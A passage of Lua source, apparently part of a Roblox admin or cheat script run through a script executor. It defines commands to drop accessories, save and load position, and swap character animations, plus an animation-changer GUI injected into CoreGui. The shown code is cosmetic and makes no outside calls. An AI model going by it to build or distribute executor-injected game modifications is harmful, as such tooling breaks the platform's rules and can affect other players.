					b.Parent = gsWorkspace
				end
			end)
		end;
	});

	-- Drops all accessories [Hats, hair etc]
	addCommand({
		["Name"] = "drophats";
		["Function"] = function()
			for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
				if v:IsA("Accessory") then
					v.Parent = workspace
				end
			end
		end;
	});

	-- Saves Position
	addCommand({
		["Name"] = "savepos";
		["Function"] = function()
			sendNotif("", "Saved Positon", 15);
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end;
    });
    
	-- Loads Position
	addCommand({
		["Name"] = "loadpos";
		["Function"] = function()
			sendNotif("", "Loaded Position", 15);
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	-- Astronaut Animation
	addCommand({
		["Name"] = "astronaut";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});


	-- Bubbly Animation
	addCommand({
		["Name"] = "bubbly";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
			Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
			Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Cartoony Animation
	addCommand({
		["Name"] = "cartoony";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Elder Animation
	addCommand({
		["Name"] = "elder";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Knight Animation
	addCommand({
		["Name"] = "knight";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Levitation Animation
	addCommand({
		["Name"] = "levitation";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Mage Animation
	addCommand({
		["Name"] = "mage";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Ninja Animation
	addCommand({
		["Name"] = "ninja";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Pirate Animation
	addCommand({
		["Name"] = "pirate";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Robot Animation
	addCommand({
		["Name"] = "robot";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Stylish Animation
	addCommand({
		["Name"] = "stylish";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- SuperHero Animation
	addCommand({
		["Name"] = "superhero";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Toy Animation
	addCommand({
		["Name"] = "toy";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Vampire Animation
	addCommand({
		["Name"] = "vampire";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Werewolf Animation
	addCommand({
		["Name"] = "werewolf";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Zombie Animation
	addCommand({
		["Name"] = "zombie";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Animation Changer GUI
	addCommand({
		["Name"] = "animations";
		["Function"] = function()
			local AnimationChanger = Instance.new("ScreenGui")
			local Main = Instance.new("Frame")
			local TopBar = Instance.new("Frame")
			local Close = Instance.new("TextButton")
			local TextLabel = Instance.new("TextLabel")
			local TextLabel_2 = Instance.new("TextLabel")
			local NormalTab = Instance.new("Frame")
			local A_Astronaut = Instance.new("TextButton")
			local A_Bubbly = Instance.new("TextButton")
			local A_Cartoony = Instance.new("TextButton")
			local A_Elder = Instance.new("TextButton")
			local A_Knight = Instance.new("TextButton")
			local A_Levitation = Instance.new("TextButton")
			local A_Mage = Instance.new("TextButton")
			local A_Ninja = Instance.new("TextButton")
			local A_Pirate = Instance.new("TextButton")
			local A_Robot = Instance.new("TextButton")
			local A_Stylish = Instance.new("TextButton")
			local A_SuperHero = Instance.new("TextButton")
			local A_Toy = Instance.new("TextButton")
			local A_Vampire = Instance.new("TextButton")
			local A_Werewolf = Instance.new("TextButton")
			local A_Zombie = Instance.new("TextButton")
			local Category = Instance.new("TextLabel")
			local SpecialTab = Instance.new("Frame")
			local A_Patrol = Instance.new("TextButton")
			local A_Confident = Instance.new("TextButton")
			local A_Popstar = Instance.new("TextButton")
			local A_Cowboy = Instance.new("TextButton")
			local A_Ghost = Instance.new("TextButton")
			local A_Sneaky = Instance.new("TextButton")
			local A_Princess = Instance.new("TextButton")
			local Category_2 = Instance.new("TextLabel")
			local OtherTab = Instance.new("Frame")
			local Category_3 = Instance.new("TextLabel")
			local A_None = Instance.new("TextButton")
			local A_Anthro = Instance.new("TextButton")

			AnimationChanger.Name = "AnimationChanger"
			AnimationChanger.Parent = game:WaitForChild("CoreGui")
			AnimationChanger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

			Main.Name = "Main"
			Main.Parent = AnimationChanger
			Main.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			Main.BorderSizePixel = 0
			Main.Position = UDim2.new(0.421999991, 0, -1, 0)
			Main.Size = UDim2.new(0, 300, 0, 250)
			Main.Active = true
			Main.Draggable = true

			TopBar.Name = "TopBar"
			TopBar.Parent = Main
			TopBar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			TopBar.BorderSizePixel = 0
			TopBar.Size = UDim2.new(0, 300, 0, 30)

			Close.Name = "Close"
			Close.Parent = TopBar
			Close.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			Close.BorderSizePixel = 0
			Close.Position = UDim2.new(0.899999976, 0, 0, 0)
			Close.Size = UDim2.new(0, 30, 0, 30)
			Close.Font = Enum.Font.SciFi
			Close.Text = "x"
			Close.TextColor3 = Color3.new(1, 0, 0.0156863)
			Close.TextSize = 20
			Close.MouseButton1Click:Connect(function()
				wait(0.3)
				Main:TweenPosition(UDim2.new(0.421999991, 0, -1.28400004, 0))
				wait(3)
				AnimationChanger:Destroy()
			end)

			TextLabel.Parent = TopBar
			TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0, 0, 0.600000024, 0)
			TextLabel.Size = UDim2.new(0, 270, 0, 10)
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.Text = "Fixed by Compwnter#5640"
			TextLabel.TextColor3 = Color3.new(1, 1, 1)
			TextLabel.TextSize = 15

			TextLabel_2.Parent = TopBar
			TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel_2.BackgroundTransparency = 1
			TextLabel_2.BorderSizePixel = 0
			TextLabel_2.Position = UDim2.new(0, 0, -0.0266667679, 0)
			TextLabel_2.Size = UDim2.new(0, 270, 0, 20)
			TextLabel_2.Font = Enum.Font.SourceSans
			TextLabel_2.Text = "Animation Changer"
			TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
			TextLabel_2.TextSize = 20

			NormalTab.Name = "NormalTab"
			NormalTab.Parent = Main
			NormalTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			NormalTab.BackgroundTransparency = 1
			NormalTab.BorderSizePixel = 0
			NormalTab.Position = UDim2.new(0.5, 0, 0.119999997, 0)
			NormalTab.Size = UDim2.new(0, 150, 0, 500)

			A_Astronaut.Name = "A_Astronaut"
			A_Astronaut.Parent = NormalTab
			A_Astronaut.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Astronaut.BorderSizePixel = 0
			A_Astronaut.Position = UDim2.new(0, 0, 0.815764725, 0)
			A_Astronaut.Size = UDim2.new(0, 150, 0, 30)
			A_Astronaut.Font = Enum.Font.SciFi
			A_Astronaut.Text = "Astronaut"
			A_Astronaut.TextColor3 = Color3.new(1, 1, 1)
			A_Astronaut.TextSize = 20
			A_Astronaut.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Bubbly.Name = "A_Bubbly"
			A_Bubbly.Parent = NormalTab
			A_Bubbly.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Bubbly.BorderSizePixel = 0
			A_Bubbly.Position = UDim2.new(0, 0, 0.349019617, 0)
			A_Bubbly.Size = UDim2.new(0, 150, 0, 30)
			A_Bubbly.Font = Enum.Font.SciFi
			A_Bubbly.Text = "Bubbly"
			A_Bubbly.TextColor3 = Color3.new(1, 1, 1)
			A_Bubbly.TextSize = 20
			A_Bubbly.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cartoony.Name = "A_Cartoony"
			A_Cartoony.Parent = NormalTab
			A_Cartoony.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cartoony.BorderSizePixel = 0
			A_Cartoony.Position = UDim2.new(0, 0, 0.407272667, 0)
			A_Cartoony.Size = UDim2.new(0, 150, 0, 30)
			A_Cartoony.Font = Enum.Font.SciFi
			A_Cartoony.Text = "Cartoony"
			A_Cartoony.TextColor3 = Color3.new(1, 1, 1)
			A_Cartoony.TextSize = 20
			A_Cartoony.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Elder.Name = "A_Elder"
			A_Elder.Parent = NormalTab
			A_Elder.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Elder.BorderSizePixel = 0
			A_Elder.Position = UDim2.new(6.51925802e-09, 0, 0.636310041, 0)
			A_Elder.Size = UDim2.new(0, 150, 0, 30)
			A_Elder.Font = Enum.Font.SciFi
			A_Elder.Text = "Elder"
			A_Elder.TextColor3 = Color3.new(1, 1, 1)
			A_Elder.TextSize = 20
			A_Elder.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Knight.Name = "A_Knight"
			A_Knight.Parent = NormalTab
			A_Knight.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Knight.BorderSizePixel = 0
			A_Knight.Position = UDim2.new(0, 0, 0.52352941, 0)
			A_Knight.Size = UDim2.new(0, 150, 0, 30)
			A_Knight.Font = Enum.Font.SciFi
			A_Knight.Text = "Knight"
			A_Knight.TextColor3 = Color3.new(1, 1, 1)
			A_Knight.TextSize = 20
			A_Knight.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Levitation.Name = "A_Levitation"
			A_Levitation.Parent = NormalTab
			A_Levitation.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Levitation.BorderSizePixel = 0
			A_Levitation.Position = UDim2.new(0, 0, 0.115472436, 0)
			A_Levitation.Size = UDim2.new(0, 150, 0, 30)
			A_Levitation.Font = Enum.Font.SciFi
			A_Levitation.Text = "Levitation"
			A_Levitation.TextColor3 = Color3.new(1, 1, 1)
			A_Levitation.TextSize = 20
			A_Levitation.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Mage.Name = "A_Mage"
			A_Mage.Parent = NormalTab
			A_Mage.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Mage.BorderSizePixel = 0
			A_Mage.Position = UDim2.new(0, 0, 0.696203232, 0)
			A_Mage.Size = UDim2.new(0, 150, 0, 30)
			A_Mage.Font = Enum.Font.SciFi
			A_Mage.Text = "Mage"
			A_Mage.TextColor3 = Color3.new(1, 1, 1)
			A_Mage.TextSize = 20
			A_Mage.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ninja.Name = "A_Ninja"
			A_Ninja.Parent = NormalTab
			A_Ninja.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ninja.BorderSizePixel = 0
			A_Ninja.Position = UDim2.new(0, 0, 0.0597896464, 0)
			A_Ninja.Size = UDim2.new(0, 150, 0, 30)
			A_Ninja.Font = Enum.Font.SciFi
			A_Ninja.Text = "Ninja"
			A_Ninja.TextColor3 = Color3.new(1, 1, 1)
			A_Ninja.TextSize = 20
			A_Ninja.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Pirate.Name = "A_Pirate"
			A_Pirate.Parent = NormalTab
			A_Pirate.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Pirate.BorderSizePixel = 0
			A_Pirate.Position = UDim2.new(-0.000333309174, 0, 0.874588311, 0)
			A_Pirate.Size = UDim2.new(0, 150, 0, 30)
			A_Pirate.Font = Enum.Font.SciFi
			A_Pirate.Text = "Pirate"
			A_Pirate.TextColor3 = Color3.new(1, 1, 1)
			A_Pirate.TextSize = 20
